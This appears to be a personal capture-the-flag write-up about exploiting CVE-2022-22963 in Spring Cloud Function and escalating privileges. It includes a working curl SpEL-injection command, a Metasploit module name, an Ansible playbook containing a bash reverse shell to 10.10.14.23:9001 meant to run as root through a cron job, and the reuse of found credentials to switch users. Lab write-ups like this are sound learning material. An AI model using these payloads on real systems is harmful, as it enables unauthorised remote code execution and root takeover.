Maven is XML based. A central repository for dependencies. The pom.xml file is the signature file.  It makes it easy to build and then easy to pull in dependencies.

I read this article on [Hacktricks on Spring Actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)

After some more research watching the basics of [pom.xml files](https://www.youtube.com/watch?v=KNGQ9JBQWhQ) I started googling looking for exploits.  I found Spring Cloud function 3.2.2 (the one installed has a CVE that can lead to RCE.)  **CVE-2022-22963**

This [article](https://sysdig.com/blog/cve-2022-22963-spring-cloud/) explains.

`curl -i -s -k -X $'POST' -H $'Host: 192.168.1.2:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary $'exploit_poc' $'http://192.168.1.2:8080/functionRouter'`

That was the suggested curl command but there was a metasploit exploit: 

```
2  exploit/multi/http/spring_cloud_function_spel_injection  2022-03-29       excellent  Yes    Spring Cloud Function SpEL Injection
```

The general plan is now: we know that there is a cron job that runs ansible playbook on any yaml file in /opt/automation/tasks directory.

I'm trying to get this ansible shell in there so that it will run as root.
```yml
- hosts: localhost
  tasks:
  - name: shell
    command: /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1' 
```

The controller for the uploaded folder (i.e., where the web page uploads to is found in the file at: /var/www/WebApp/src/main/java/com/example/WebApp/user)

The uploads directory is `/var/www/WebApp/src/main/uploads`  I uploaded a test file and looked in there. It had been saved with frank as the owner and group.  So that means that it won't upload into the target automation directory because he doesn't have permissions.

I did a lot of fruitless googling for how to use thos maven creds and didn't really find anything. I tried just doing an `su` to phil with the credentials.

It worked. I was able to SU to phil. (!!!)  I had tried this earlier but must have kept typing the password wrong?  Also, I'm not sure if there's a difference between SU and SSH.  Maybe I couldn't ssh in because of the key?
